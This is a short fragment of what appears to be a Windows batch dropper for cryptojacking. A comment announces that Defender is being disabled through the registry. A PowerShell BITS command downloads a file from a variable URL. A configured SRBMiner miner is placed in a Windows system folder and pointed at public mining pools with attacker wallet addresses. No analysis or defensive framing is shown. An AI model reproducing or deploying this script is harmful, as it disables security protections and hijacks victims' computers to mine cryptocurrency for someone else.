...
:: Add the registry key to disable Defender
...
powershell -Command "Start-BitsTransfer -Source '%URL%' -Destination '%DEST%'"
...
set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool de.epicmine.io:3333 --pool pool.supportxmr.com:443 --wallet 0x6810d21581c27.Worker02 --wallet 49LoCaAuWAoFSmqEfXKdxsM84VbTEp4CqN5yuKk3Y8Ls2jesAXs9AiWbdUfs8JVxLP1P3owpcLYm9FFhfpma9TvSPCwTHuD --password Worker02 --password Worker02 --keepalive true --keepalive true --nicehash false --nicehash false --tls false --tls true"
